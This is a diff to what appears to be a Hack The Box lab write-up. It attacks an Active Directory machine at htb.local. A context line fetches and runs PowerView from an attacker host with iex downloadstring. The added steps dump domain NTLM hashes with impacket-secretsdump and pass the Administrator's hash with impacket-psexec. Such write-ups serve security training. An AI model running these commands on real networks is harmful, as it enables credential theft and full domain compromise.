@@ -324,9 +324,21 @@ C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.28/PowerView.
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231679673-783389bb-0226-414b-97fc-673e3f8d516f.png)
 
+![image](https://user-images.githubusercontent.com/83878909/231682343-0ec66aa4-a7c3-4536-87d1-c4346db7fb4d.png)
 
-  - Give the user DcSync privileges.
-  - This is possible because the user is a part of the Exchange Windows Permissions group which has WriteDacl permission on the htb.local domain.
+---
+
+### Dump NTLM Hashes
+  - Use the `impacket-secretsdump` script to dump the NTLM password hashes of all the users on the domain as well as the administrator.
 ```CSS
-▶ 
+▶ impacket-secretsdump htb.local/random:passwd123@10.10.10.161
 ```
+
+---
+
+### Pass the Hash Attack
+  -  script to perform a pass the hash attack with the Administrator’s hash.
+```
+▶ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+```
+![image](https://user-images.githubusercontent.com/83878909/231684320-89710ea2-6063-47ab-ba97-03a4750a0863.png)
